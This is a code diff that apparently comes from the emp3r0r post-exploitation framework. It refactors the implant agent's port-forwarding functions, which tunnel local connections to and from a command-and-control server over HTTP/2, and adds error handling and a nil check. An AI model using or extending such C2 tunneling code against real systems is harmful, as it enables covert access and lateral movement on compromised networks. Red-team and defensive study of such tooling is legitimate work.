@@ -79,7 +79,10 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 	var (
 		session PortFwdSession
 
-		url = emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + sessionID
+		url = fmt.Sprintf("%s%s/%s",
+			emp3r0r_data.CCAddress,
+			tun.ProxyAPI,
+			sessionID)
 
 		// connection
 		conn   *h2conn.Conn
@@ -97,6 +100,9 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
 	} else {
 		conn, ctx, cancel, err = ConnectCC(url)
+		if err != nil {
+			return fmt.Errorf("failed to connect to CC: %v", err)
+		}
 		log.Printf("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)
 		go tun.FwdToDport(ctx, cancel, addr, sessionID, protocol, conn, timeout)
 	}
@@ -133,17 +139,19 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 
 // start a local listener on agent, forward connections to CC
 func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
-	port, sessionID string) {
-	var (
-		err error
-	)
+	port, sessionID string,
+) {
+	var err error
 
 	// serve a TCP connection received on agent side
 	serveConn := func(conn net.Conn) {
 		// tell CC this is a reversed port mapping
 		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
 		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
-		url := emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + shID
+		url := fmt.Sprintf("%s%s/%s",
+			emp3r0r_data.CCAddress,
+			tun.ProxyAPI,
+			shID)
 
 		// start a h2 connection per incoming TCP connection
 		h2, _, h2cancel, err := ConnectCC(url)
@@ -152,8 +160,10 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 			return
 		}
 		defer func() {
-			_, _ = h2.Write([]byte("exit\n"))
-			h2cancel()
+			if h2 != nil {
+				_, _ = h2.Write([]byte("exit\n"))
+				h2cancel()
+			}
 			conn.Close()
 		}()
 
